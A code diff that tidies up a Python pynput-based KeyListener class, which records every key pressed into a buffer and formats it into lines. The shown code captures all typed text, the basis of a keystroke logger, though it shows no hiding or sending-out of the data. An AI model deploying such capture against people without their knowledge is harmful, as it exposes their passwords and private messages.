@@ -1,4 +1,3 @@
-import threading
 from pynput import keyboard
 import time
 
@@ -31,21 +30,22 @@ class KeyListener:
             if key == keyboard.Key.space:
                 self.keys.append(' ')
                 cont += 1
-            else:
+            elif hasattr(key, 'char'):
                 self.keys.append(key.char)
                 cont += 1
+
             # Space between keys to improve readability
             if cont > 70:
                 self.keys.append('\n')
                 cont = 0
-        except AttributeError:
-            pass
+        except AttributeError as e:
+            print(e)
 
     def start_listener(self):
         """
         Starts the listener thread.
 
-        This function starts the listener thread by calling the `start` method on the `listener_thread` object.
+        This function starts the listener by calling the `start` method.
 
         Parameters:
             None
@@ -54,7 +54,7 @@ class KeyListener:
             None
         """
         self.listener = keyboard.Listener(on_press=self.on_press)
-        self.listener.start()  # Run the listener in the main thread
+        self.listener.start()  
 
     def stop_listener(self):
         """
